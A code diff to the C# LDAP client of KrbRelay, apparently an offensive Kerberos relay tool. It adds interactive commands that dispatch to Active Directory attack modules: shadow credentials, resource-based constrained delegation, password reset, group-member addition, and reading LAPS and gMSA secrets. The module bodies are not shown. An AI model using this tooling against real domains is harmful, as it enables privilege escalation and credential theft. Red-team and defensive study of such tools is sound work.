@@ -126,16 +126,47 @@ namespace KrbRelay.Clients
                         case "computer":
                             break;
 
+                        case "group":
+                            break;
+
                         case "reset-password":
+                            Attacks.Ldap.setPassword.attack(ld, arg1, arg2);
                             break;
 
                         case "add-groupmember":
+                            Attacks.Ldap.addGroupMember.attack(ld, arg1, arg2);
                             break;
 
                         case "add-acl":
                             break;
 
                         case "rm-acl":
+                            break;
+                        
+                        case "shadowcred":
+                            if (string.IsNullOrEmpty(arg1))
+                            {
+                                Console.WriteLine("[-] shadowcred requires an argument");
+                                break;
+                            }
+                            Attacks.Ldap.ShadowCredential.attack(ld, arg1);
+                            break;
+
+                        case "rbcd":
+                            if (string.IsNullOrEmpty(arg1) || string.IsNullOrEmpty(arg2))
+                            {
+                                Console.WriteLine("[-] rbcd requires two arguments");
+                                break;
+                            }
+                            Attacks.Ldap.RBCD.attack(ld, arg1, arg2);
+                            break;
+
+                        case "laps":
+                            Attacks.Ldap.LAPS.read(ld, arg1);
+                            break;
+
+                        case "gmsa":
+                            Attacks.Ldap.gMSA.read(ld, arg1);
                             break;
 
                         case "exit":
@@ -145,19 +176,23 @@ namespace KrbRelay.Clients
                         default:
                             Console.WriteLine(
                                 "Commands:\n" +
-                                "user <user>          - List user attributes\n" +
-                                "group <group>        - List group attributes\n" +
-                                "computer <computer>  - List computer attributes\n" +
-                                //"add-acl <target> <SDDL> - Add SDDL to object\n" +
-                                //"rm-acl  <target> <SDDL> - Remove SDDL to object\n" +
+                                //"user <user>          - List user attributes\n" +
+                                //"group <group>        - List group attributes\n" +
+                                //"computer <computer>  - List computer attributes\n" +
+                                "shadowcred  <TARGET>              - Configure msDS-KeyCredentialLink \n" +
+                                "rbcd  <SID> <TARGET>              - Configure RBCD\n" +
                                 "reset-password  <user> <password> - Reset user password\n" +
                                 "add-groupmember <group> <user>    - Add member to group\n" +
-                                "rm-groupmember  <group> <user>    - Remove member from group\n" +
+                                "laps                              - Read LAPS\n" +
+                                "gmsa                              - Read gMSA\n" +
+                                //"rm-groupmember  <group> <user>    - Remove member from group\n" +
                                 "exit\n");
                             break;
                     }
                     if (exit)
+                    {
                         break;
+                    }
                 }
             }
             catch (Exception e)
